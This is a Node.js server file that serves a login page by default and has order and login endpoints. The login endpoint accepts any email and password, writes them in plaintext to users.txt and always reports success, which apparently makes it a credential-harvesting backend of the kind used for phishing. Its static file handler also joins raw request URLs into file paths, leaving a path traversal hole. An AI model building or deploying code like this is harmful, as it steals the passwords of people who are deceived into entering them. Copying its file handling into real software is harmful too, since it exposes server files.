const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = 8080;

const MIME_TYPES = {
    '.html': 'text/html',
    '.css': 'text/css',
    '.js': 'application/javascript',
    '.png': 'image/png',
    '.jpg': 'image/jpeg',
    '.gif': 'image/gif'
};

const server = http.createServer((req, res) => {
    console.log(`Request: ${req.method} ${req.url}`);
    
    // API Endpoint for Ordering
    if (req.url === '/api/order' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => {
            body += chunk.toString();
        });
        req.on('end', () => {
            console.log('Order received:', body);
            const orderId = 'ORD-' + Math.random().toString(36).substr(2, 9).toUpperCase();
            
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ 
                success: true, 
                message: 'Order placed successfully', 
                orderId: orderId 
            }));
        });
        return;
    }
    
    // API Endpoint for Login
    if (req.url === '/api/login' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => {
            body += chunk.toString();
        });
        req.on('end', () => {
            console.log('Login attempt received:', body);
            
            // Parse body (simple JSON parse)
            try {
                const data = JSON.parse(body);
                const email = data.email;
                const password = data.password;
                
                // Store in file
                const logEntry = `${new Date().toISOString()} | Email: ${email} | Password: ${password}\n`;
                fs.appendFile('users.txt', logEntry, (err) => {
                    if (err) console.error('Failed to save user:', err);
                });
                
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ 
                    success: true, 
                    message: 'Login successful' 
                }));
            } catch (e) {
                res.writeHead(400, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: false, message: 'Invalid JSON' }));
            }
        });
        return;
    }
    
    // Serve Static Files
    let filePath = '.' + req.url;
    if (filePath === './') {
        filePath = './login.html';
    } else if (filePath === './index' || filePath === './index.html') {
        filePath = './index.html';
    } else if (filePath === './login' || filePath === './login.html') {
        filePath = './login.html';
    } else if (filePath === './main' || filePath === './main.html') {
        filePath = './main.html';
    }
    
    const extname = path.extname(filePath);
    let contentType = MIME_TYPES[extname] || 'text/html'; // Default to html for cleaner URLs
    
    fs.readFile(filePath, (error, content) => {
        if (error) {
            if (error.code === 'ENOENT') {
                res.writeHead(404, { 'Content-Type': 'text/html' });
                res.end('<h1>404 Not Found</h1>', 'utf-8');
            } else {
                res.writeHead(500);
                res.end(`Server Error: ${error.code}`);
            }
        } else {
            res.writeHead(200, { 'Content-Type': contentType });
            res.end(content, 'utf-8');
        }
    });
});

server.listen(PORT, () => {
    console.log(`Node.js Server running at http://localhost:${PORT}/`);
    console.log('This is a fallback server. You can also compile and run server.cpp.');
});
